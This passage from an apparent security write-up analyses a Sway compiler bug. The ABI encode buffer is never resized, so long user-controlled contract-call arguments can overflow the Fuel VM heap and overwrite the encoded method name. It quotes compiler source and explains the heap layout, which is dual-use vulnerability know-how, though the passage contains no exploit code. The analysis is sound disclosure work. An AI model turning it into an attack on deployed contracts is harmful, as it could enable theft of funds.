invoke__">into</span>()),</span><br><span class="line">                                is_absolute: <span class="literal">false</span>,</span><br><span class="line">                            &#125;,</span><br><span class="line">                            type_arguments: TypeArgs::<span class="title function_ invoke__">Regular</span>(<span class="built_in">vec!</span>[</span><br><span class="line">                                TypeArgument &#123;</span><br><span class="line">                                    type_id: return_type,</span><br><span class="line">                                    initial_type_id: return_type,</span><br><span class="line">                                    span: Span::<span class="title function_ invoke__">dummy</span>(),</span><br><span class="line">                                    call_path_tree: <span class="literal">None</span>,</span><br><span class="line">                                &#125;,</span><br><span class="line">                                TypeArgument &#123;</span><br><span class="line">                                    type_id: tuple_args_type_id,</span><br><span class="line">                                    initial_type_id: tuple_args_type_id,</span><br><span class="line">                                    span: Span::<span class="title function_ invoke__">dummy</span>(),</span><br><span class="line">                                    call_path_tree: <span class="literal">None</span>,</span><br><span class="line">                                &#125;,</span><br><span class="line">                            ]),</span><br><span class="line">                            span: Span::<span class="title function_ invoke__">dummy</span>(),</span><br><span class="line">                        &#125;,</span><br><span class="line">                        resolved_call_path_binding: <span class="literal">None</span>,</span><br><span class="line">                        arguments: <span class="built_in">vec!</span>[</span><br><span class="line">                            Expression &#123;</span><br><span class="line">                                kind: ExpressionKind::<span class="title function_ invoke__">Literal</span>(Literal::<span class="title function_ invoke__">B256</span>([<span class="number">0u8</span>; <span class="number">32</span>])),</span><br><span class="line">                                span: Span::<span class="title function_ invoke__">dummy</span>(),</span><br><span class="line">                            &#125;,</span><br><span class="line">                            method_name_expr,</span><br><span class="line">                            <span class="title function_ invoke__">as_tuple</span>(arguments),</span><br><span class="line">                            coins_expr,</span><br><span class="line">                            asset_id_expr,</span><br><span class="line">                            gas_expr,</span><br><span class="line">                        ],</span><br><span class="line">                    &#125;,</span><br><span class="line">                )),</span><br><span class="line">                span: original_span,</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">contract_call</span> = <span class="title function_ invoke__">call_contract_call</span>(</span><br><span class="line">            &amp;<span class="keyword">mut</span> ctx,</span><br><span class="line">            span,</span><br><span class="line">            method.return_type.type_id,</span><br><span class="line">            <span class="title function_ invoke__">string_slice_literal</span>(&amp;method.name),</span><br><span class="line">            old_arguments.<span class="title function_ invoke__">first</span>().<span class="title function_ invoke__">cloned</span>().<span class="title function_ invoke__">unwrap</span>(),</span><br><span class="line">            args,</span><br><span class="line">            arguments.<span class="title function_ invoke__">iter</span>().<span class="title function_ invoke__">map</span>(|x| x.<span class="number">1</span>.return_type).<span class="title function_ invoke__">collect</span>(),</span><br><span class="line">            coins_expr,</span><br><span class="line">            asset_id_expr,</span><br><span class="line">            gas_expr,</span><br><span class="line">        );</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>contract_call</code> is responsible for several tasks: serializing the arguments, calling the external contract, and then deserializing the return value. The panic occurred when an external contract was called and the function name could not be found. This indicates either the serialized function name provided to the external contract is incorrect, or the function dispatching in the external contract does not work properly.</p>
<p>Before we dig further into the Swaylend incident, let’s take a step back and discuss the compiler bug we mentioned earlier, which we discovered during the Fuel Attackathon. This will provide important context for the Swaylend case when we revisit it later.</p>
<p>The codec library defines a trait called <code>AbiEncode</code> used for <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/3b142d56b1982cfe0f356762ce571e16a8d41635/sway-lib-core/src/codec.sw#L150">encoding data</a>. Any structures passed across contract boundaries must implement this trait for the compiler to be able to serialize it.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">AbiEncode</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">abi_encode</span>(<span class="keyword">self</span>, buffer: Buffer) <span class="punctuation">-&gt;</span> Buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>At the core of the trait is a <code>Buffer</code> structure, which is used to track encoded data. A <code>Buffer</code> is created with the <code>__encode_buffer_empty</code> intrinsic, and serialized structure bytestreams are appended to it through the <code>__encode_buffer_append</code> intrinsic. Once encoding is complete, the <code>Buffer</code> is destructured into a <code>raw_slice</code> using the <code>encode_buffer_as_raw_slice</code> intrinsic.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Buffer</span> &#123;</span><br><span class="line">    buffer: (raw_ptr, <span class="type">u64</span>, <span class="type">u64</span>), <span class="comment">// ptr, capacity, size</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Buffer</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">new</span>() <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        Buffer &#123;</span><br><span class="line">            buffer: __encode_buffer_empty(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">AbiEncode</span> <span class="keyword">for</span> <span class="title class_">bool</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">abi_encode</span>(<span class="keyword">self</span>, buffer: Buffer) <span class="punctuation">-&gt;</span> Buffer &#123;</span><br><span class="line">        Buffer &#123;</span><br><span class="line">            buffer: __encode_buffer_append(buffer.buffer, <span class="keyword">self</span>),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">encode</span>&lt;T&gt;(item: T) <span class="punctuation">-&gt;</span> raw_slice</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    T: AbiEncode,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = item.<span class="title function_ invoke__">abi_encode</span>(Buffer::<span class="title function_ invoke__">new</span>());</span><br><span class="line">    buffer.<span class="title function_ invoke__">as_raw_slice</span>()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">AsRawSlice</span> <span class="keyword">for</span> <span class="title class_">Buffer</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">as_raw_slice</span>(<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> raw_slice &#123;</span><br><span class="line">        __encode_buffer_as_raw_slice(<span class="keyword">self</span>.buffer)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>While the usage of all these intrinsics may seem overwhelming at first, the compiler implementations are actually quite simple.</p>
<p>In <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/d92274886b08b20405a087bcf9dba7e8a1c7e0bf/sway-core/src/ir_generation/function.rs#L1500">EncodeBufferEmpty</a>, the compiler allocates a memory chunk of size 1024, and packs the <code>(ptr, capacity = 1024, len = 0)</code> tuple into the <code>Buffer</code> structure before returning it.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">Intrinsic::EncodeBufferEmpty =&gt; &#123;</span><br><span class="line">    <span class="built_in">assert!</span>(arguments.<span class="title function_ invoke__">is_empty</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">uint64</span> = Type::<span class="title function_ invoke__">get_uint64</span>(context);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let cap = 1024;</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">cap</span> = Value::<span class="title function_ invoke__">new_constant</span>(</span><br><span class="line">        context,</span><br><span class="line">        Constant &#123;</span><br><span class="line">            ty: uint64,</span><br><span class="line">            value: ConstantValue::<span class="title function_ invoke__">Uint</span>(<span class="number">1024</span>),</span><br><span class="line">        &#125;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// let ptr = asm(cap: cap) &#123;</span></span><br><span class="line">    <span class="comment">//  aloc cap;</span></span><br><span class="line">    <span class="comment">//  hp: u64</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">args</span> = <span class="built_in">vec!</span>[AsmArg &#123;</span><br><span class="line">        name: Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;cap&quot;</span>.<span class="title function_ invoke__">into</span>()),</span><br><span class="line">        initializer: <span class="title function_ invoke__">Some</span>(cap),</span><br><span class="line">    &#125;];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">body</span> = <span class="built_in">vec!</span>[AsmInstruction &#123;</span><br><span class="line">        op_name: Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;aloc&quot;</span>.<span class="title function_ invoke__">into</span>()),</span><br><span class="line">        args: <span class="built_in">vec!</span>[Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;cap&quot;</span>.<span class="title function_ invoke__">into</span>())],</span><br><span class="line">        immediate: <span class="literal">None</span>,</span><br><span class="line">        metadata: <span class="literal">None</span>,</span><br><span class="line">    &#125;];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ptr</span> = <span class="keyword">self</span>.current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">asm_block</span>(</span><br><span class="line">        args,</span><br><span class="line">        body,</span><br><span class="line">        uint64,</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;hp&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ptr_u8</span> = Type::<span class="title function_ invoke__">new_ptr</span>(context, Type::<span class="title function_ invoke__">get_uint8</span>(context));</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ptr</span> = <span class="keyword">self</span>.current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">int_to_ptr</span>(ptr, ptr_u8);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">len</span> = Constant::<span class="title function_ invoke__">new_uint</span>(context, <span class="number">64</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">len</span> = Value::<span class="title function_ invoke__">new_constant</span>(context, len);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">compile_to_encode_buffer</span>(context, ptr, cap, len)?;</span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(TerminatorValue::<span class="title function_ invoke__">new</span>(buffer, context))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/d92274886b08b20405a087bcf9dba7e8a1c7e0bf/sway-core/src/ir_generation/function.rs#L1543">Appending to the <code>Buffer</code></a> is slightly more involved, but it can be broken down into a few simple steps</p>
<ol>
<li>Calculate the address of <code>&amp;Buffer.ptr[Buffer.len]</code></li>
<li>Store the encoded data at the calculated address.</li>
<li>Increase <code>Buffer.len</code></li>
</ol>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">Intrinsic::EncodeBufferAppend =&gt; &#123;</span><br><span class="line">    <span class="built_in">assert!</span>(arguments.<span class="title function_ invoke__">len</span>() == <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = &amp;arguments[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = return_on_termination_or_extract!(</span><br><span class="line">        <span class="keyword">self</span>.<span class="title function_ invoke__">compile_expression_to_value</span>(context, md_mgr, buffer)?</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> (ptr, cap, len) = <span class="keyword">self</span>.<span class="title function_ invoke__">compile_buffer_into_parts</span>(context, buffer)?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Append item</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">item</span> = &amp;arguments[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">item_span</span> = item.span.<span class="title function_ invoke__">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">item_type</span> = engines.<span class="title function_ invoke__">te</span>().<span class="title function_ invoke__">get</span>(item.return_type);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">item</span> = return_on_termination_or_extract!(</span><br><span class="line">        <span class="keyword">self</span>.<span class="title function_ invoke__">compile_expression_to_value</span>(context, md_mgr, item)?</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Define some helper functions</span></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">increase_len</span>(</span><br><span class="line">        current_block: &amp;<span class="keyword">mut</span> Block,</span><br><span class="line">        context: &amp;<span class="keyword">mut</span> Context,</span><br><span class="line">        len: Value,</span><br><span class="line">        step: <span class="type">u64</span>,</span><br><span class="line">    ) <span class="punctuation">-&gt;</span> Value &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(len.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">is_uint64</span>(context));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">uint64</span> = Type::<span class="title function_ invoke__">get_uint64</span>(context);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">step</span> = Value::<span class="title function_ invoke__">new_constant</span>(</span><br><span class="line">            context,</span><br><span class="line">            Constant &#123;</span><br><span class="line">                ty: uint64,</span><br><span class="line">                value: ConstantValue::<span class="title function_ invoke__">Uint</span>(step),</span><br><span class="line">            &#125;,</span><br><span class="line">        );</span><br><span class="line">        current_block</span><br><span class="line">            .<span class="title function_ invoke__">append</span>(context)</span><br><span class="line">            .<span class="title function_ invoke__">binary_op</span>(BinaryOpKind::Add, len, step)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">calc_addr_as_ptr</span>(</span><br><span class="line">        current_block: &amp;<span class="keyword">mut</span> Block,</span><br><span class="line">        context: &amp;<span class="keyword">mut</span> Context,</span><br><span class="line">        ptr: Value,</span><br><span class="line">        len: Value,</span><br><span class="line">        ptr_to: Type,</span><br><span class="line">    ) <span class="punctuation">-&gt;</span> Value &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(ptr.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">is_ptr</span>(context));</span><br><span class="line">        <span class="built_in">assert!</span>(len.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">is_uint64</span>(context));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">uint64</span> = Type::<span class="title function_ invoke__">get_uint64</span>(context);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ptr</span> = current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">ptr_to_int</span>(ptr, uint64);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">addr</span> = current_block</span><br><span class="line">            .<span class="title function_ invoke__">append</span>(context)</span><br><span class="line">            .<span class="title function_ invoke__">binary_op</span>(BinaryOpKind::Add, ptr, len);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">ptr_to</span> = Type::<span class="title function_ invoke__">new_ptr</span>(context, ptr_to);</span><br><span class="line">        current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">int_to_ptr</span>(addr, ptr_to)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">append_with_store</span>(</span><br><span class="line">        current_block: &amp;<span class="keyword">mut</span> Block,</span><br><span class="line">        context: &amp;<span class="keyword">mut</span> Context,</span><br><span class="line">        addr: Value,</span><br><span class="line">        len: Value,</span><br><span class="line">        item: Value,</span><br><span class="line">    ) <span class="punctuation">-&gt;</span> Value &#123;</span><br><span class="line">        <span class="built_in">assert!</span>(addr.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">is_ptr</span>(context));</span><br><span class="line">        <span class="built_in">assert!</span>(addr</span><br><span class="line">            .<span class="title function_ invoke__">get_type</span>(context)</span><br><span class="line">            .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">            .<span class="title function_ invoke__">get_pointee_type</span>(context)</span><br><span class="line">            .<span class="title function_ invoke__">unwrap</span>()</span><br><span class="line">            .<span class="title function_ invoke__">eq</span>(context, &amp;item.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>()));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">_</span> = current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">store</span>(addr, item);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">uint64</span> = Type::<span class="title function_ invoke__">get_uint64</span>(context);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">step</span> = Value::<span class="title function_ invoke__">new_constant</span>(</span><br><span class="line">            context,</span><br><span class="line">            Constant &#123;</span><br><span class="line">                ty: uint64,</span><br><span class="line">                value: ConstantValue::<span class="title function_ invoke__">Uint</span>(<span class="number">1</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">        );</span><br><span class="line">        current_block</span><br><span class="line">            .<span class="title function_ invoke__">append</span>(context)</span><br><span class="line">            .<span class="title function_ invoke__">binary_op</span>(BinaryOpKind::Add, len, step)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actual operation starts from here</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">new_len</span> = <span class="keyword">match</span> &amp;*item_type &#123;</span><br><span class="line">        TypeInfo::Boolean =&gt; &#123;</span><br><span class="line">            <span class="built_in">assert!</span>(item.<span class="title function_ invoke__">get_type</span>(context).<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">is_bool</span>(context));</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">addr</span> = <span class="title function_ invoke__">calc_addr_as_ptr</span>(</span><br><span class="line">                &amp;<span class="keyword">mut</span> <span class="keyword">self</span>.current_block,</span><br><span class="line">                context,</span><br><span class="line">                ptr,</span><br><span class="line">                len,</span><br><span class="line">                Type::<span class="title function_ invoke__">get_bool</span>(context),</span><br><span class="line">            );</span><br><span class="line">            <span class="title function_ invoke__">append_with_store</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>.current_block, context, addr, len, item)</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">compile_to_encode_buffer</span>(context, ptr, cap, new_len)?;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(TerminatorValue::<span class="title function_ invoke__">new</span>(buffer, context))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>And <a target="_blank" rel="noopener" href="https://github.com/FuelLabs/sway/blob/d92274886b08b20405a087bcf9dba7e8a1c7e0bf/sway-core/src/ir_generation/function.rs#L1919">EncodeBufferAsRawSlice</a> packs <code>Buffer.ptr</code> and <code>Buffer.len</code> into a <code>raw_slice</code> structure.</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Intrinsic::EncodeBufferAsRawSlice =&gt; &#123;</span><br><span class="line">    <span class="built_in">assert!</span>(arguments.<span class="title function_ invoke__">len</span>() == <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = &amp;arguments[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = return_on_termination_or_extract!(</span><br><span class="line">        <span class="keyword">self</span>.<span class="title function_ invoke__">compile_expression_to_value</span>(context, md_mgr, buffer)?</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">uint64</span> = Type::<span class="title function_ invoke__">get_uint64</span>(context);</span><br><span class="line">    <span class="keyword">let</span> (ptr, _, len) = <span class="keyword">self</span>.<span class="title function_ invoke__">compile_buffer_into_parts</span>(context, buffer)?;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">ptr</span> = <span class="keyword">self</span>.current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">ptr_to_int</span>(ptr, uint64);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">slice_as_tuple</span> = <span class="keyword">self</span>.<span class="title function_ invoke__">compile_tuple_from_values</span>(</span><br><span class="line">        context,</span><br><span class="line">        <span class="built_in">vec!</span>[ptr, len],</span><br><span class="line">        <span class="built_in">vec!</span>[uint64, uint64],</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">    )?;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//asm(s: (ptr, len)) &#123;</span></span><br><span class="line">    <span class="comment">//  s: raw_slice</span></span><br><span class="line">    <span class="comment">//&#125;;</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">return_type</span> = Type::<span class="title function_ invoke__">get_slice</span>(context);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">buffer</span> = <span class="keyword">self</span>.current_block.<span class="title function_ invoke__">append</span>(context).<span class="title function_ invoke__">asm_block</span>(</span><br><span class="line">        <span class="built_in">vec!</span>[AsmArg &#123;</span><br><span class="line">            name: Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;s&quot;</span>.<span class="title function_ invoke__">into</span>()),</span><br><span class="line">            initializer: <span class="title function_ invoke__">Some</span>(slice_as_tuple),</span><br><span class="line">        &#125;],</span><br><span class="line">        <span class="built_in">vec!</span>[],</span><br><span class="line">        return_type,</span><br><span class="line">        <span class="title function_ invoke__">Some</span>(Ident::<span class="title function_ invoke__">new_no_span</span>(<span class="string">&quot;s&quot;</span>.<span class="title function_ invoke__">into</span>())),</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">Ok</span>(TerminatorValue::<span class="title function_ invoke__">new</span>(buffer, context))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>It is clear that <code>EncodeBufferAppend</code> contains a critical bug: the buffer is never resized when the encoded data exceeds the original buffer length. If the encoded data is large, the append operation will silently overflow the allocated heap memory and overwrite subsequent data.</p>
<p>So, what consequences could this bug have? To answer that, we need to understand what lies after the overflown data chunk. The Fuel VM heap grows from high memory towards low memory and never garbage collects. Thus chunks allocated later are always placed at lower memory addresses than those allocated earlier. As a result, a sufficiently large overflow on a newer chunk can always overwrite data in an older chunk.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">         Fuel VM Heap Layout</span><br><span class="line">+-----------------------------------+ &lt;- High Memory (Start of Heap)</span><br><span class="line">|  Older Allocated Chunks           |</span><br><span class="line">|  .                                |  ⬆</span><br><span class="line">|  .                                |  ⬆ (overflow old chunks)</span><br><span class="line">|  .                                |  ⬆</span><br><span class="line">+-----------------------------------+  ⬆</span><br><span class="line">|  Newer Allocated Chunk            |  ⬆ writing direction</span><br><span class="line">+-----------------------------------+ </span><br><span class="line">|  (Free Space)                     |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------------------------+ &lt;- Low Memory (End of Heap)</span><br></pre></td></tr></table></figure>

<p>In <code>contract_call</code>, we can identify 3 encodings at play. The <code>method_name</code> is generally hardcoded and short, making it is unlikely to overflow during encoding. On the other hand, the <code>args</code> are often user-controllable and can have dynamic lengths, thus susceptible to overflow. The same applies to <code>params</code>. Since <code>method_name</code> is encoded before <code>args</code>, the heap chunk in the <code>Buffer</code> for the <code>first_parameter</code> (<code>method_name</code>) precedes the heap chunk in the <code>Buffer</code> for <code>second_parameter</code> (<code>args</code>). This means a sufficiently long <code>arg</code> can overflow during execution and overwrite the <code>method_name</code> being called, resulting in the unknown function name error we observed.</p>
